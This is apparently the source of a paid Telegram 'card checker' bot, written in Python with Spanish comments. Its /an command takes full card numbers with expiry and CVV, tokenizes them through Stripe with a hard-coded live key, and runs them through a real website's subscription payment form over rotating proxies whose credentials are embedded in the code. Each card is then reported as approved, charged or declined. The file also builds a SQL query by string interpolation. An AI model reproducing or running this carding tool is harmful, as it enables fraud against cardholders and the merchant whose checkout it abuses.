import random
import hashlib
import json
import requests
import time
import asyncio
import os
import re
import colored 
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
import mysql.connector


from user import*
from db import*
# Establece los detalles de la conexión

# Establece los detalles de la conexión
def multiexplode(delimiters, string):
    """
    Separa una cadena en elementos utilizando múltiples delimitadores.

    :param delimiters: Lista de delimitadores como cadena o lista.
    :param string: Cadena a ser dividida.
    :return: Lista de elementos separados.
    """
    if isinstance(delimiters, str):
        delimiters = [delimiters]

    # Reemplazar todos los delimitadores por el primer delimitador
    current_delimiter = delimiters[0]
    for delimiter in delimiters[1:]:
        string = string.replace(delimiter, current_delimiter)

    # Dividir la cadena utilizando el primer delimitador
    return string.split(current_delimiter)



@Client.on_message(filters.command(["an"], ["/", "."]))
async def ch(_, message: Message):
            username = message.from_user.username
            chat_id = message.chat.id
            user_id = (
        message.from_user.id
    )

            # Consultar si el usuario es premium en la tabla "users"
            queryUsers = "SELECT * FROM users WHERE user_id = %s AND status = 'Premium'"
            cursorUsers = db.cursor()
            cursorUsers.execute(queryUsers, (user_id,))
            resultUsers = cursorUsers.fetchall()
        
            # Verificar si el usuario es premium
            if len(resultUsers) == 0:
                message_text = "Para usar el bot, debes comprar Azunachk. Por favor, ponte en contacto con los vendedores para obtener más información."
                await message.reply_text(f"<i>{message_text}</i>")
                return
            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("""
━━━━━「𝘼𝙯𝙪𝙣𝙖 𝘾𝙝𝙠」━━━━
♻️ Comando /an 🔰
Formato: cc|mm|yy|cvv
➤ Gateway: Stripe Charged
━━━━━「𝘼𝙯𝙪𝙣𝙖 𝘾𝙝𝙠」━━━━""")
                return

            ccs = data[1]
            card = multiexplode([":", "|", "/", " ","!"], ccs)
            cc = card[0]
            mes = card[1]
            if len(cc) != 16:
                await message.reply_text("Card Not Found. La tarjeta debe tener 16 dígitos.")
                return
            if len(mes) != 2:
                await message.reply_text("Card Not Found. mes inválido")
                return
            
            # Verificar si el año tiene 2 o 4 dígitos
            regex_pattern = r"\b\d{2}\b|\b\d{4}\b"
            match = re.search(regex_pattern, card[2])
        
            if match:
                ano = match.group()  # Obtener el año coincidente
            else:
                await message.reply_text("Formato de año no válido.")
                return
            
            cvv = card[3]
            bin_code = cc[:6]
            
            if len(cvv) != 3:
                await message.reply_text("Card Not Found. cvv inválido")
                return
            
            # Verificar si el bin está en la lista de bins prohibidos
            banned_file = "bin_banned.txt"
            if os.path.exists(banned_file):
                with open(banned_file, "r") as file:
                    banned_bins = file.read().splitlines()
                if bin_code in banned_bins:
                    await message.reply_text("Bin Banned")
                    return

            #dabese variable
        
            username = message.from_user.username
    
            user_id = (
        message.from_user.id
    )
         
        
           
                # Crea un cursor para ejecutar consultas
            
    
    
            
                
                # Ejecuta una consulta SQL para buscar al usuario por su User ID
            query = f"SELECT status FROM users WHERE user_id='{user_id}'"
            cursor.execute(query)
                 
            # Obtiene el resultado de la consulta
            result = cursor.fetchone()
            if result is None:
             await message.reply_text("No estás registrado. Por favor, utiliza /register para registrarte.")
             return  
                # Verifica el resultado y almacena el valor en la variable "rank"
            
            rank = result[0]
            if message.from_user.id in antispam_users and antispam_users[message.from_user.id] + 16 > int(time.time()):
             time_left = antispam_users[message.from_user.id] + 16 - int(time.time())
             await message.reply_text(f"❗️ [<i>ANTISPAM DETECTADO</i>]. Espera {time_left} segundos antes de enviar otro comando.")
             return 
            else:
             antispam_users[message.from_user.id] = int(time.time())

                
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
            reply = await message.reply_text("<b>Cargando proceso...</b>")        
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            
            
                        #variables
                        
                       

        
            
            proxies={
            "http": "http://fgdimgys-rotate:ag9u5rhwb9b4@p.webshare.io:80/",
            "https": "http://fgdimgys-rotate:ag9u5rhwb9b4@p.webshare.io:80/"
}

            session = requests.Session()
            
        
            
                        
                        
            
            tiempo_inicio = time.perf_counter()
            tiempo_fin = time.time()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe Charged</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]....■■□□□□□□□□ →20%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe Charged</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■□□□□□□□ →30%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")
  

   
    #-----------------------------------------------------------------------------------------------
    
            zip_code = random.randint(10001, 90045)
            rand_num = random.randint(0, 99999)
            password = random.randint(0000000000, 9999999999)
            email = hashlib.md5(str(random.randint(0, 999999)).encode()).hexdigest()[:7]
            name = hashlib.md5(str(random.randint(0, 999999)).encode()).hexdigest()[:7]
            last = hashlib.md5(str(random.randint(0, 999999)).encode()).hexdigest()[:7]
            headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',

        }
        
            data = f'card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=68470569-0cea-40fa-b2b8-bedce477f3f76d9ef1&muid=73402294-60fc-4642-bf63-86a3067d5174c4adbc&sid=53d35f40-d379-4cab-84c1-3bdddd5b421b7f772f&payment_user_agent=stripe.js%2Fd749fa7cbc%3B+stripe-js-v3%2Fd749fa7cbc&time_on_page=54836&key=pk_live_hQJRYWUjPLlW7MCl6AD0P3Zl&_stripe_version=2020-08-27'
            
            response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data, proxies=proxies,)
            response_data = response.json()
            if 'error' in response_data and 'message' in response_data['error']:
                errormessage = response_data['error']['message']
                stripeerror = True
            else:    
             id1= response_data['id']    
             stripeerror = False   
            
            
    # Resto del código utilizando id0


            
            if not stripeerror:
             # Edita el mensaje original con un nuevo texto
             tiempo_fin = time.perf_counter()
             duracion = tiempo_fin - tiempo_inicio
             tiempo = round(duracion, 2)  # Redondear a 2 decimales
             await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■□□□□□ →50%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")  
             
             cookies = {
      '_gid': 'GA1.2.823749773.1687661200',
      '_fbp': 'fb.1.1687661201929.1545663283',
      '__stripe_mid': '73402294-60fc-4642-bf63-86a3067d5174c4adbc',
      '__stripe_sid': '53d35f40-d379-4cab-84c1-3bdddd5b421b7f772f',
      '_ga': 'GA1.2.687850661.1687661199',
      '_ga_YGTBWN904E': 'GS1.1.1687661199.1.1.1687661211.0.0.0',
            }
            
             headers = {
                'authority': 'savage.love',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                # 'cookie': '_gid=GA1.2.823749773.1687661200; _fbp=fb.1.1687661201929.1545663283; __stripe_mid=73402294-60fc-4642-bf63-86a3067d5174c4adbc; __stripe_sid=53d35f40-d379-4cab-84c1-3bdddd5b421b7f772f; _ga=GA1.2.687850661.1687661199; _ga_YGTBWN904E=GS1.1.1687661199.1.1.1687661211.0.0.0',
                'origin': 'https://savage.love',
                'pragma': 'no-cache',
                'referer': 'https://savage.love/subscribe/',
                'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                
            }
            
             
             data = f'{{"action":"supportingcast_payment_form_join","_wp_http_referer":"/subscribe/","redirect_url":"/get-started","email":"{name}@gmail.com","stripeToken":"{id1}","stripePostalCode":"","first_name":"","last_name":"","data":{{"member_address__address1":"","member_address__address2":"","member_address__city":"","member_address__state":"","member_address__zip":"","member_address__country":""}},"promo_code":"","g-recaptcha-response":"","plan_id":"6438","mode":"JOIN","sct_data":{{}}}}'

             response = requests.post(
             'https://savage.love/wp-json/supportingcast/v1/payment_form',
             headers=headers,
             data=data,
             proxies=proxies,
)
             response_data = response.json()

             if 'field_errors' in response_data and 'card_message' in response_data['field_errors']:
                errormessage = response_data['field_errors']['card_message']
             elif 'field_errors' in response_data and 'g-recaptcha-response' in response_data['field_errors']:
                errormessage = 'Porfavor vuelve a intentar error de pago'
             elif 'message' in response_data:
                 errormessage='Charged 8$!'
             else:
                errormessage = 'Ha ocurrido un error desconocido en el proceso de pago.'
            
            errormessage = errormessage.strip()

          
           
            
                      
            await asyncio.sleep(3)
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe Charged</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■□ →95%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")  
            
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
               
            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe Charged</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■■→100%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""") 
            
            keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("📿 Canal", url="https://t.me/AzunaChkLinks"),
               
            ]
        ]
    )
            if errormessage=="Your card has insufficient funds.":
                await reply.edit_text(f"""   
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> {errormessage}</code>
<i>Gateway ➤</i> Stripe Charged
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""",
            reply_markup=keyboard)
            elif(errormessage=="Your card's security code is incorrect."):
                await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved CCN! ✅</b> 
<i>Message ➤</i><code> {errormessage}</code>
<i>Gateway ➤</i> Stripe Charged
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""",
            reply_markup=keyboard)
            elif(errormessage=="Charged 8$!"):
                await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> {errormessage}</code>
<i>Gateway ➤</i> Stripe Charged
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""",
            reply_markup=keyboard)
           
            else:
                await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Declined! ❌</b> 
<i>Message ➤</i><code> {errormessage}</code>
<i>Gateway ➤</i> Stripe Charged
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""",
            reply_markup=keyboard) 

            
